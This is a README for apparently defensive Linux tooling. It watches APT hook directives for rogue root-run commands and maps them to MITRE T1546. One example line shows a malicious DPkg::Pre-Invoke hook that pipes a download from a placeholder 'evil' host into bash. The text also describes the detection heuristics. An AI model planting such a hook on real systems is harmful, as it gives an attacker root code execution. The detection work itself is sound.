# apt-hooks-watchdog

Boot + daily delta of the APT config hook directives
(`/etc/apt/apt.conf` + `/etc/apt/apt.conf.d/*`) against a learned
baseline, plus an ownership + command scan. Catches a hook that
runs as root on apt operations. MITRE **T1546** (Event Triggered
Execution).

## Why this matters

APT runs hook directives **as root** on every apt/dpkg
operation:

- `DPkg::Pre-Invoke`, `DPkg::Post-Invoke`, `DPkg::Pre-Install-Pkgs`
- `APT::Update::Pre-Invoke`, `APT::Update::Post-Invoke`,
  `APT::Update::Post-Invoke-Success`

A rogue hook fires on the next package install or `apt update`:

```
DPkg::Pre-Invoke {"curl -s http://evil | bash";};   # root, on apt install
```

It hides as routine package-manager config and runs with full
root on a routine admin action. Distinct from
`package-trust-baseline` (repo/signature trust) — this watches
the exec HOOKS.

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any apt-hook change → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No apt config | `ok` | `no_apt_config` |
| No delta | `ok` | `apt_hooks_intact` |
| A hook / file added, removed, or changed | `warn` | `apt_hooks_changed` |
| A hook command under /tmp /home /dev/shm, world-writable, or bare/relative; an injection pattern; or a world-writable/non-root apt.conf | `alert` | `apt_hooks_suspicious` |

## What's recorded

- `file:<path>:<sha12>` — hash of each apt.conf file.
- `own:<path>:<owner:mode>` — owner + mode.
- `hook:<directive>:<cmd0>` — each hook's command first token
  (bare commands like `test`/`dpkg` are benign, a tmp/relative
  path is the signature).

## Cadence

`OnBootSec=40min` + `OnCalendar=*-*-* 09:25:00` — extends the
staggered ladder after anacrontab (09:20). A rogue hook runs on
the next apt operation, so the boot catch confirms the hooks
after a restart.

## MITRE coverage

- **T1546** Event Triggered Execution — an apt/dpkg operation is
  the trigger that runs the hook as root.
- **T1059.004** — the hook command is shell execution.
- **T1195.002** (adjacent) — package-manager subversion.

## Operator workflow

```bash
journalctl -t selfdef-apt-hooks -n 1 --no-pager
journalctl -t selfdef-apt-hooks-detail --since "1 day ago"

# Inventory the configured hooks
apt-config dump 2>/dev/null | grep -iE 'Pre-Invoke|Post-Invoke|Pre-Install-Pkgs'
grep -rniE 'Pre-Invoke|Post-Invoke|Pre-Install-Pkgs' /etc/apt/apt.conf /etc/apt/apt.conf.d/ 2>/dev/null

# Investigate a suspicious alert, then re-baseline:
sudo $EDITOR /etc/apt/apt.conf.d/<file>
sudo rm /var/lib/selfdef/apt-hooks-baseline.tsv
sudo systemctl start selfdef-apt-hooks.service
```

## Caveats

- **Legit packages add hooks** (apt-listchanges, needrestart,
  unattended-upgrades, dpkg-fsys-usrunmess); a new hook fires
  `warn`, and the tmp/relative-command + injection + ownership
  tiers are the high-confidence alert. Re-baseline after vetting.
- **Non-apt distros** (dnf/yum) → `no_apt_config` no-op;
  dnf-automatic-config covers the dnf side, and dnf has its own
  plugin-exec surface (a future sibling).
- **Daily+boot cadence** misses an inject-apt-revert within the
  window; an audit-rules watch on `/etc/apt/apt.conf.d` writes is
  the real-time complement.

## Coexistence

- **package-trust-baseline**: apt-secure (repo/signature trust);
  this watches the exec HOOKS that run during apt operations.
  Both apt-subsystem surfaces.
- **cron-job / systemd-unit / logrotate / udev watchdogs**: the
  root-exec-on-event family — this adds the package-operation
  trigger surface.
- **aide-bridge / integrity-sentinel**: byte-level integrity on
  the apt configs; this adds the hook-command semantic view.
